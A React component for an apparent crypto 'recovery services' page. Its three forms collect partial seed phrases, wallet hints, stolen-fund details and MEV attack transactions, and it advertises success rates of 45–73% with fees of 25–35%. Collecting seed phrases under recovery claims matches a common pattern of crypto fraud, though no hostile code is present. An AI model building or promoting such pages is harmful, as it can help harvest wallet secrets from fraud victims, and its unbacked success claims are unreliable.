import { useState } from 'react';
import { Shield, AlertTriangle, Zap, Lock, Eye, EyeOff } from 'lucide-react';

export default function AdvancedRecovery({ walletAddress }) {
  const [activeTab, setActiveTab] = useState('phrase');
  const [loading, setLoading] = useState(false);
  const [results, setResults] = useState(null);
  const [showSensitive, setShowSensitive] = useState(false);

  // Phrase Recovery Form
  const [phraseData, setPhraseData] = useState({
    partialPhrase: '',
    walletHints: '',
    lastKnownBalance: '',
    recoveryMethod: 'Standard'
  });

  // Stolen Funds Form
  const [stolenData, setStolenData] = useState({
    victimWallet: walletAddress || '',
    thiefWallet: '',
    stolenAmount: '',
    incidentDate: '',
    evidenceType: ''
  });

  // MEV Attack Form
  const [mevData, setMevData] = useState({
    walletAddress: walletAddress || '',
    attackTxHash: '',
    lossAmount: '',
    attackType: 'MEV/Sandwich'
  });

  const handlePhraseRecovery = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/recover-wallet-phrase', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(phraseData)
      });
      const result = await response.json();
      setResults(result);
    } catch (error) {
      console.error('Phrase recovery error:', error);
      setResults({ success: false, error: 'Recovery request failed' });
    }
    setLoading(false);
  };

  const handleStolenFunds = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/recover-stolen-funds', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(stolenData)
      });
      const result = await response.json();
      setResults(result);
    } catch (error) {
      console.error('Stolen funds recovery error:', error);
      setResults({ success: false, error: 'Recovery request failed' });
    }
    setLoading(false);
  };

  const handleMevRecovery = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/recover-mev-attack', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(mevData)
      });
      const result = await response.json();
      setResults(result);
    } catch (error) {
      console.error('MEV recovery error:', error);
      setResults({ success: false, error: 'Recovery request failed' });
    }
    setLoading(false);
  };

  const tabs = [
    { id: 'phrase', name: '🔐 Lost Wallet Recovery', icon: Lock, color: 'red' },
    { id: 'stolen', name: '🚨 Stolen Funds Recovery', icon: AlertTriangle, color: 'orange' },
    { id: 'mev', name: '🦖 MEV Attack Recovery', icon: Zap, color: 'purple' }
  ];

  return (
    <div className="bg-white rounded-2xl shadow-2xl border border-gray-200 overflow-hidden">
      <div className="bg-gradient-to-r from-red-600 via-orange-600 to-purple-600 p-6">
        <div className="flex items-center space-x-4">
          <div className="w-12 h-12 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center">
            <Shield className="w-6 h-6 text-white" />
          </div>
          <div>
            <h2 className="text-2xl font-black text-white">Advanced Recovery Services</h2>
            <p className="text-white/90 font-medium">Professional-grade crypto recovery solutions</p>
          </div>
        </div>
      </div>

      <div className="border-b border-gray-200">
        <div className="flex overflow-x-auto">
          {tabs.map((tab) => (
            <button
              key={tab.id}
              onClick={() => {
                setActiveTab(tab.id);
                setResults(null);
              }}
              className={`flex-1 min-w-0 px-6 py-4 text-sm font-bold transition-all ${
                activeTab === tab.id
                  ? `text-${tab.color}-600 border-b-2 border-${tab.color}-500 bg-${tab.color}-50`
                  : 'text-gray-500 hover:text-gray-700 hover:bg-gray-50'
              }`}
            >
              <div className="flex items-center justify-center space-x-2">
                <tab.icon className="w-4 h-4" />
                <span className="truncate">{tab.name}</span>
              </div>
            </button>
          ))}
        </div>
      </div>

      <div className="p-6">
        {activeTab === 'phrase' && (
          <div className="space-y-6">
            <div className="bg-red-50 border border-red-200 rounded-xl p-4">
              <div className="flex items-start space-x-3">
                <Lock className="w-5 h-5 text-red-600 mt-0.5" />
                <div>
                  <h3 className="font-bold text-red-800 mb-1">Lost Wallet Phrase Recovery</h3>
                  <p className="text-red-700 text-sm">
                    Our experts can help recover lost seed phrases using advanced cryptographic techniques.
                    <span className="font-semibold"> Success Rate: 73% • Fee: 25%</span>
                  </p>
                </div>
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-bold text-gray-700 mb-2">
                  Partial Seed Phrase (if available)
                </label>
                <div className="relative">
                  <textarea
                    value={phraseData.partialPhrase}
                    onChange={(e) => setPhraseData({...phraseData, partialPhrase: e.target.value})}
                    placeholder="Enter any words you remember from your seed phrase..."
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500"
                    rows="3"
                    type={showSensitive ? 'text' : 'password'}
                  />
                  <button
                    type="button"
                    onClick={() => setShowSensitive(!showSensitive)}
                    className="absolute top-3 right-3 text-gray-400 hover:text-gray-600"
                  >
                    {showSensitive ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>

              <div>
                <label className="block text-sm font-bold text-gray-700 mb-2">
                  Wallet Creation Hints
                </label>
                <input
                  value={phraseData.walletHints}
                  onChange={(e) => setPhraseData({...phraseData, walletHints: e.target.value})}
                  placeholder="When created, wallet type, device used, etc."
                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-2">
                    Last Known Balance ($)
                  </label>
                  <input
                    value={phraseData.lastKnownBalance}
                    onChange={(e) => setPhraseData({...phraseData, lastKnownBalance: e.target.value})}
                    placeholder="5000"
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500"
                  />
                </div>
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-2">
                    Recovery Method
                  </label>
                  <select
                    value={phraseData.recoveryMethod}
                    onChange={(e) => setPhraseData({...phraseData, recoveryMethod: e.target.value})}
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500"
                  >
                    <option value="Standard">Standard Analysis</option>
                    <option value="Brute Force">Brute Force Attack</option>
                    <option value="Dictionary">Dictionary Attack</option>
                    <option value="Pattern">Pattern Analysis</option>
                  </select>
                </div>
              </div>

              <button
                onClick={handlePhraseRecovery}
                disabled={loading || !phraseData.walletHints}
                className="w-full bg-gradient-to-r from-red-600 to-red-700 text-white font-bold py-4 px-6 rounded-xl hover:from-red-700 hover:to-red-800 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? 'Submitting Recovery Request...' : '🔐 Start Phrase Recovery'}
              </button>
            </div>
          </div>
        )}

        {activeTab === 'stolen' && (
          <div className="space-y-6">
            <div className="bg-orange-50 border border-orange-200 rounded-xl p-4">
              <div className="flex items-start space-x-3">
                <AlertTriangle className="w-5 h-5 text-orange-600 mt-0.5" />
                <div>
                  <h3 className="font-bold text-orange-800 mb-1">Stolen Funds Recovery</h3>
                  <p className="text-orange-700 text-sm">
                    Track and recover stolen cryptocurrency using blockchain forensics.
                    <span className="font-semibold"> Success Rate: 67% • Fee: 30%</span>
                  </p>
                </div>
              </div>
            </div>

            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-2">
                    Your Wallet Address
                  </label>
                  <input
                    value={stolenData.victimWallet}
                    onChange={(e) => setStolenData({...stolenData, victimWallet: e.target.value})}
                    placeholder="0x..."
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                  />
                </div>
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-2">
                    Thief's Wallet Address
                  </label>
                  <input
                    value={stolenData.thiefWallet}
                    onChange={(e) => setStolenData({...stolenData, thiefWallet: e.target.value})}
                    placeholder="0x..."
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-2">
                    Stolen Amount ($)
                  </label>
                  <input
                    value={stolenData.stolenAmount}
                    onChange={(e) => setStolenData({...stolenData, stolenAmount: e.target.value})}
                    placeholder="10000"
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                  />
                </div>
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-2">
                    Incident Date
                  </label>
                  <input
                    type="date"
                    value={stolenData.incidentDate}
                    onChange={(e) => setStolenData({...stolenData, incidentDate: e.target.value})}
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                  />
                </div>
              </div>

              <div>
                <label className="block text-sm font-bold text-gray-700 mb-2">
                  Evidence Type
                </label>
                <select
                  value={stolenData.evidenceType}
                  onChange={(e) => setStolenData({...stolenData, evidenceType: e.target.value})}
                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                >
                  <option value="">Select evidence type</option>
                  <option value="Transaction Hash">Transaction Hash</option>
                  <option value="Screenshots">Screenshots</option>
                  <option value="Email Evidence">Email Evidence</option>
                  <option value="Exchange Records">Exchange Records</option>
                  <option value="Other">Other</option>
                </select>
              </div>

              <button
                onClick={handleStolenFunds}
                disabled={loading || !stolenData.victimWallet || !stolenData.thiefWallet || !stolenData.stolenAmount}
                className="w-full bg-gradient-to-r from-orange-600 to-orange-700 text-white font-bold py-4 px-6 rounded-xl hover:from-orange-700 hover:to-orange-800 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? 'Opening Investigation...' : '🚨 Start Stolen Funds Recovery'}
              </button>
            </div>
          </div>
        )}

        {activeTab === 'mev' && (
          <div className="space-y-6">
            <div className="bg-purple-50 border border-purple-200 rounded-xl p-4">
              <div className="flex items-start space-x-3">
                <Zap className="w-5 h-5 text-purple-600 mt-0.5" />
                <div>
                  <h3 className="font-bold text-purple-800 mb-1">MEV/Sandwich Attack Recovery</h3>
                  <p className="text-purple-700 text-sm">
                    Counter MEV bots and recover funds from sandwich attacks.
                    <span className="font-semibold"> Success Rate: 45% • Fee: 35%</span>
                  </p>
                </div>
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-bold text-gray-700 mb-2">
                  Your Wallet Address
                </label>
                <input
                  value={mevData.walletAddress}
                  onChange={(e) => setMevData({...mevData, walletAddress: e.target.value})}
                  placeholder="0x..."
                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-purple-500"
                />
              </div>

              <div>
                <label className="block text-sm font-bold text-gray-700 mb-2">
                  Attack Transaction Hash
                </label>
                <input
                  value={mevData.attackTxHash}
                  onChange={(e) => setMevData({...mevData, attackTxHash: e.target.value})}
                  placeholder="0x..."
                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-purple-500"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-2">
                    Loss Amount ($)
                  </label>
                  <input
                    value={mevData.lossAmount}
                    onChange={(e) => setMevData({...mevData, lossAmount: e.target.value})}
                    placeholder="2500"
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-purple-500"
                  />
                </div>
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-2">
                    Attack Type
                  </label>
                  <select
                    value={mevData.attackType}
                    onChange={(e) => setMevData({...mevData, attackType: e.target.value})}
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-purple-500"
                  >
                    <option value="MEV/Sandwich">MEV/Sandwich Attack</option>
                    <option value="Front-running">Front-running</option>
                    <option value="Back-running">Back-running</option>
                    <option value="Liquidation">Liquidation Attack</option>
                    <option value="Other">Other MEV Attack</option>
                  </select>
                </div>
              </div>

              <button
                onClick={handleMevRecovery}
                disabled={loading || !mevData.walletAddress || !mevData.attackTxHash}
                className="w-full bg-gradient-to-r from-purple-600 to-purple-700 text-white font-bold py-4 px-6 rounded-xl hover:from-purple-700 hover:to-purple-800 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? 'Analyzing Attack...' : '🦖 Start MEV Counter-Attack'}
              </button>
            </div>
          </div>
        )}

        {results && (
          <div className={`mt-6 p-4 rounded-xl border ${
            results.success 
              ? 'bg-green-50 border-green-200' 
              : 'bg-red-50 border-red-200'
          }`}>
            <div className="flex items-start space-x-3">
              <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
                results.success ? 'bg-green-500' : 'bg-red-500'
              }`}>
                <span className="text-white text-sm font-bold">
                  {results.success ? '✓' : '✗'}
                </span>
              </div>
              <div className="flex-1">
                <h4 className={`font-bold mb-2 ${
                  results.success ? 'text-green-800' : 'text-red-800'
                }`}>
                  {results.success ? 'Recovery Request Submitted' : 'Request Failed'}
                </h4>
                <p className={`text-sm mb-3 ${
                  results.success ? 'text-green-700' : 'text-red-700'
                }`}>
                  {results.message || results.error}
                </p>
                
                {results.success && (
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                    {results.caseId && (
                      <div className="bg-white p-2 rounded border">
                        <div className="text-xs text-gray-600">Case ID</div>
                        <div className="font-bold text-sm">{results.caseId}</div>
                      </div>
                    )}
                    <div className="bg-white p-2 rounded border">
                      <div className="text-xs text-gray-600">Est. Time</div>
                      <div className="font-bold text-sm">{results.estimatedTime}</div>
                    </div>
                    <div className="bg-white p-2 rounded border">
                      <div className="text-xs text-gray-600">Success Rate</div>
                      <div className="font-bold text-sm">{results.successRate}</div>
                    </div>
                    <div className="bg-white p-2 rounded border">
                      <div className="text-xs text-gray-600">Fee</div>
                      <div className="font-bold text-sm">{results.fee}</div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}